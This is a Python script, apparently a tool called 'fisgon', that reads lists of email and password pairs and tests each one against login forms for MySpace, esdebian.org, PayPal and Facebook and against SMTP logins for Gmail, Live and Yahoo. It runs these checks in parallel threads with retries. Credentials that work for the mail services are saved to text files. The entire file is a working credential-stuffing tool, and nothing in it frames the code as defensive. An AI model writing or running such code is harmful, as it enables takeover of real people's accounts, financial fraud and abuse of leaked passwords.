#!/usr/bin/env python
#-*- coding: UTF-8 -*-
from browser import BROWSER
import re
import smtplib
import socket
import sys
import time
import os
import debug as Debug
debug = Debug.debug

from decoradores import Cache, Retry, Async, Verbose
from threading import Thread

RC = "%s/.fisgon/" % os.getenv("HOME")
VERBOSE = 3


class Discovers(list):
    def __call__(self, func):
        self.append(func)
        return func

discovers = Discovers()


def ismail(user):
    if re.search(
        r"(^[-!#$%&'*+/=?^_`{}|~0-9A-Z]+(\.[-!#$%&'*+/=?^_`{}|~0-9A-Z]+)*"
        r'|^"([\001-\010\013\014\016-\037!#-\[\]-\177]'
        r'|\\[\001-011\013\014\016-\177])*"'
        r')@(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+[A-Z]{2,6}\.?$',
        user, re.IGNORECASE):
        return True
    else:
        return False

@discovers
@Cache(ruta=RC + "myspace.pickle")
@Retry(15)
def myspace(user, password):
    if ismail(user):
        b.clear_cookies()
        form = b.get_forms("http://myspace.com", cache=1000)[1]
        form["""ctl00$ctl00$cpMain$cpMain$LoginBox$Email_Textbox"""] = user
        form["""ctl00$ctl00$cpMain$cpMain$LoginBox$Password_Textbox"""] = password
        try:
            code, title = form.submit()
            if code == 200:
                if """?fuseaction=signout""" in b.get_html():
                    return "myspace.com"
                else:
                    return False
            else:
                return None
        except BrowserStateError:
            return None
    else:
        return False

@discovers
@Cache(ruta=RC + "esdebian.pickle")
@Retry(15)
def esdebian(user, password):
    if ismail(user):
        b.clear_cookies()
        form = b.get_forms("http://www.esdebian.org", cache=1000)[1]
        form["name"] = user
        form["pass"] = password
        try:
            code, title = form.submit()
            if code == 200:
                if """<a href="/logout">Salir</a>""" in b.get_html():
                    return "esdebian.org"
                else:
                    return False
            else:
                return None
        except BrowserStateError:
            return None
    else:
        return False

@discovers
@Cache(ruta=RC + "paypal.pickle")
@Retry(15)
def paypal(user, password):
    if ismail(user):
        b.clear_cookies()
        form = b.get_forms("https://www.paypal.com/ar/cgi-bin/webscr"
            "?cmd=_login-run", cache=0*1000)[1]
        form["login_email"] = user
        form["login_password"] = password
        try:
            code, title = form.submit()
            if code == 200:
                if ('cgi-bin/webscr?cmd=_login-done' in b.get_html()):
                    return "paypal.com"
                elif ('cgi-bin/webscr?cmd=_logout' in b.get_html(
                    "https://www.paypal.com/ar/cgi-bin/webscr?"
                    "cmd=_account&nav=0")):
                    return "paypal.com"
                else:
                    return False
            else:
                return None
        except BrowserStateError:
            return None
    else:
        return False

@discovers
@Cache(ruta=RC + "facebook.pickle")
@Retry(15)
def facebook(user, password):
    if ismail(user):
        b.clear_cookies()
        form = b.get_forms("http://facebook.com", cache=1000)[0]
        form["email"] = user
        form["pass"] = password
        try:
            code, title = form.submit()
            if code == 200:
                if """facebook.com/logout.php?""" in b.get_html():
                    return "facebook.com"
                else:
                    return False
            else:
                return None
        except BrowserStateError:
            return None
    else:
        return False

@discovers
@Async
@Cache(ruta=RC + "gmail.pickle")
@Retry(15)
@Verbose(VERBOSE)
def gmail(user, password):
    if ismail(user):
        smtp = smtplib.SMTP()
        try:
            smtp.connect("smtp.gmail.com", 587)
            smtp.ehlo()
            smtp.starttls()
            smtp.debuglevel = 0
            try:
                smtp.login(user, password)
            except smtplib.SMTPAuthenticationError:
                return False
            except socket.sslerror:
                return False
        except socket.gaierror:
            debug("E: socket.gaierror")
            return None
    else:
        return False
    write(";".join((user, password)), "gmail.txt")
    return "gmail.com"

@discovers
@Async
@Cache(ruta=RC + "live.pickle")
@Retry(15)
@Verbose(VERBOSE)
def live(user, password):
    if ismail(user):
        smtp = smtplib.SMTP()
        try:
            smtp.connect("smtp.live.com", 587)
            smtp.ehlo()
            smtp.starttls()
            smtp.debuglevel = 0
            try:
                smtp.login(user, password)
            except smtplib.SMTPAuthenticationError:
                return False
            except socket.sslerror:
                return False
        except socket.gaierror:
            debug("E: socket.gaierror")
            return None
    else:
        return False
    write(";".join((user, password)), "live.txt")
    return "live.com"

@discovers
@Async
@Cache(ruta=RC + "yahoo.pickle")
@Retry(15)
@Verbose(VERBOSE)
def yahoo(user, password):
    if ismail(user) and "@yahoo." in user:
        smtp = smtplib.SMTP()
        try:
            smtp.connect("smtp.mail.yahoo.com", 587)
            smtp.debuglevel = 0
            smtp.ehlo()
            try:
                smtp.login(user, password)
            except smtplib.SMTPAuthenticationError:
                return False
        except socket.gaierror:
            debug("E: socket.gaierror")
            return None
    else:
        return False
    write(";".join((user, password)), "yahoo.txt")
    return "yahoo.com"


def write(text, destination):
    f = open(destination, "a")
    f.write("%s\n" % text)
    f.close()


def main():
    debug("FUN TIME!")
    entrada = sys.stdin.readlines()

    threads = 20
    slots = [None] * threads
    for line in entrada:
        user, password = line.strip().split(";")[:2]
        user = user.lower()

        for discover in discovers:
            if isinstance(discover, Async):
                passed = False
                while not passed:
                    for pos in xrange(threads):
                        if slots[pos] is None or not slots[pos].is_alive():
                            slots[pos] = discover(user, password)
                            passed = True
                            break
                    time.sleep(1)

    for slot in slots:
        if slot is not None:
            slot.get_result()

#        #Monotarea
#        resultados = [d(user, password)
#            for d in discovers if not isinstance(d, Async)]

    debug(">>> EOF !!")

if __name__ == "__main__":
    b = BROWSER()
    exit(main())
